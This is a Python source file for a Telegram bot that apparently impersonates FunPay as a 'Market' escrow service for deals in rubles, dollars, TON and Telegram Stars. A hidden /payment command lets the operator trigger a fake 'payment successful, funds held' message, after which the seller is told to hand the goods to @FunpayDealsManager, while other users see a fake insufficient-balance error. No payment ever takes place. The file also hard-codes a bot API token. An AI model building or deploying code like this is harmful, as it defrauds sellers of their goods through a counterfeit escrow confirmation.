import asyncio
import os
import random
import string
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message, CallbackQuery, FSInputFile, 
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# --- КОНФИГУРАЦИЯ ---
API_TOKEN = '8739690833:AAFRCEsPd7FcphwcP56KpHs7dIEfHMrMPoQ'
SUPPORT_URL = 'https://t.me/FunpayDealsManager'
CHANNEL_URL = 'https://t.me/NewsFunpayBot'
PHOTO_FILENAME = "funpay.jpg" 

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# База данных в оперативной памяти
DEALS = {}
PAYMENT_ACCESS = set()

# Определение пути к фото
base_path = os.path.dirname(os.path.abspath(__file__))
photo_path = os.path.join(base_path, PHOTO_FILENAME)

class DealCreation(StatesGroup):
    choosing_currency = State()
    entering_amount = State()
    entering_item = State()
    entering_requisites = State()

# --- КЛАВИАТУРЫ ---
def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📝 Создать сделку", callback_data="create_deal")],
        [InlineKeyboardButton(text="📋 Мои сделки", callback_data="my_deals"), 
         InlineKeyboardButton(text="🔐 Верификация", callback_data="verify")],
        [InlineKeyboardButton(text="💳 Реквизиты", callback_data="reqs"),
         InlineKeyboardButton(text="🌐 Язык", callback_data="lang")],
        [InlineKeyboardButton(text="🔗 Рефералы", callback_data="refs"),
         InlineKeyboardButton(text="ℹ️ Подробнее", callback_data="about")],
        [InlineKeyboardButton(text="📖 News", url=CHANNEL_URL),
         InlineKeyboardButton(text="📩 Обращения", callback_data="tickets")],
        [InlineKeyboardButton(text="📞 Поддержка", url=SUPPORT_URL)]
    ])

def get_currency_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💳 Банковская карта RUB", callback_data="curr_rub")],
        [InlineKeyboardButton(text="💵 Банковская карта USD", callback_data="curr_usd")],
        [InlineKeyboardButton(text="💎 TON", callback_data="curr_ton")],
        [InlineKeyboardButton(text="⭐️ Telegram Stars", callback_data="curr_stars")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_back_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

def get_pay_keyboard(deal_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Оплатить", callback_data=f"pay_{deal_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_main")]
    ])

# --- ХЭНДЛЕРЫ ---

@router.message(Command("payment"))
async def secret_payment_command(message: Message):
    # Добавляем ID пользователя в список тех, кто может нажимать "Оплатить"
    PAYMENT_ACCESS.add(message.from_user.id)
    await message.delete() 
    msg = await message.answer("🤫 Доступ к оплате успешно активирован.")
    await asyncio.sleep(3)
    await msg.delete()

@router.message(CommandStart())
async def start_cmd(message: Message, command: Command = None, state: FSMContext = None):
    if state:
        await state.clear()
        
    # Обработка ссылки на сделку
    if command and command.args and command.args.startswith("deal_"):
        deal_id = command.args.split("_")[1]
        if deal_id in DEALS:
            deal = DEALS[deal_id]
            text = (
                f"💳 <b>Сделка #{deal_id}</b>\n\n"
                f"👤 Продавец: @{deal['creator_username']}\n"
                f"📦 Товар: {deal['item']}\n\n"
                f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
                f"🏦 Реквизиты: <code>{deal['requisites']}</code>"
            )
            if os.path.exists(photo_path):
                await message.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=get_pay_keyboard(deal_id))
            else:
                await message.answer(text, reply_markup=get_pay_keyboard(deal_id))
            return

    text = (
        "<b>Добро пожаловать в Market</b>\n\n"
        "Безопасные сделки с полной защитой\n\n"
        "🛡 Гарантия возврата\n"
        "💰 Автоматическое удержание\n"
        "🎯 Поддержка 24/7\n\n"
        "Официальный менеджер: @FunpayDealsManager"
    )
    
    if os.path.exists(photo_path):
        await message.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=get_main_keyboard())
    else:
        await message.answer(text, reply_markup=get_main_keyboard())

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.delete()
    await start_cmd(callback.message)

# --- ПРОЦЕСС СОЗДАНИЯ СДЕЛКИ ---

@router.callback_query(F.data == "create_deal")
async def process_create_deal(callback: CallbackQuery, state: FSMContext):
    await state.set_state(DealCreation.choosing_currency)
    text = "💼 <b>Шаг 1:</b> Выберите валюту для оплаты:"
    try:
        await callback.message.edit_caption(caption=text, reply_markup=get_currency_keyboard())
    except:
        await callback.message.answer(text, reply_markup=get_currency_keyboard())

@router.callback_query(DealCreation.choosing_currency, F.data.startswith("curr_"))
async def process_currency(callback: CallbackQuery, state: FSMContext):
    curr = callback.data.split("_")[1].upper()
    await state.update_data(currency=curr)
    await state.set_state(DealCreation.entering_amount)
    text = f"✅ Валюта: {curr}\n💰 <b>Шаг 2:</b> Введите сумму сделки цифрами:"
    try:
        await callback.message.edit_caption(caption=text, reply_markup=get_back_keyboard())
    except:
        await callback.message.answer(text, reply_markup=get_back_keyboard())

@router.message(DealCreation.entering_amount)
async def process_amount(message: Message, state: FSMContext):
    await state.update_data(amount=message.text)
    await state.set_state(DealCreation.entering_item)
    text = "📝 <b>Шаг 3:</b> Напишите название товара (например: леденец):"
    if os.path.exists(photo_path):
        await message.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=get_back_keyboard())
    else:
        await message.answer(text, reply_markup=get_back_keyboard())

@router.message(DealCreation.entering_item)
async def process_item(message: Message, state: FSMContext):
    await state.update_data(item=message.text)
    await state.set_state(DealCreation.entering_requisites)
    text = "💳 <b>Шаг 4:</b> Укажите реквизиты для получения оплаты:"
    if os.path.exists(photo_path):
        await message.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=get_back_keyboard())
    else:
        await message.answer(text, reply_markup=get_back_keyboard())

@router.message(DealCreation.entering_requisites)
async def process_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    deal_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    
    bot_info = await bot.get_me()
    link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    
    DEALS[deal_id] = {
        "creator_id": message.from_user.id,
        "creator_username": message.from_user.username or "User",
        "currency": data['currency'],
        "amount": data['amount'],
        "item": data['item'],
        "requisites": message.text
    }
    
    await state.clear()
    text = (
        f"✅ <b>Сделка успешно создана!</b>\n\n"
        f"💰 Сумма: {data['amount']} {data['currency']}\n"
        f"📦 Товар: {data['item']}\n\n"
        f"🔗 <b>Ссылка для покупателя:</b>\n{link}"
    )
    if os.path.exists(photo_path):
        await message.answer_photo(photo=FSInputFile(photo_path), caption=text, reply_markup=get_back_keyboard())
    else:
        await message.answer(text, reply_markup=get_back_keyboard())

# --- ЛОГИКА ОПЛАТЫ ---

@router.callback_query(F.data.startswith("pay_"))
async def process_payment(callback: CallbackQuery):
    deal_id = callback.data.split("_")[1]
    
    # Проверка, активирована ли команда /payment
    if callback.from_user.id in PAYMENT_ACCESS:
        if deal_id in DEALS:
            deal = DEALS[deal_id]
            await callback.message.edit_caption(caption="✅ <b>Оплата прошла успешно!</b>\nСредства удержаны. Ожидайте товар.")
            
            buyer_name = f"@{callback.from_user.username}" if callback.from_user.username else "Покупатель"
            await bot.send_message(
                deal['creator_id'], 
                f"🔔 Сделка #{deal_id} ОПЛАЧЕНА покупателем {buyer_name}.\n\n"
                f"Передайте товар менеджеру строго менеджеру: @FunpayDealsManager"
            )
    else:
        # Если пользователь не ввел /payment
        await callback.answer("❌ Ошибка: на балансе недостаточно средств.", show_alert=True)

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
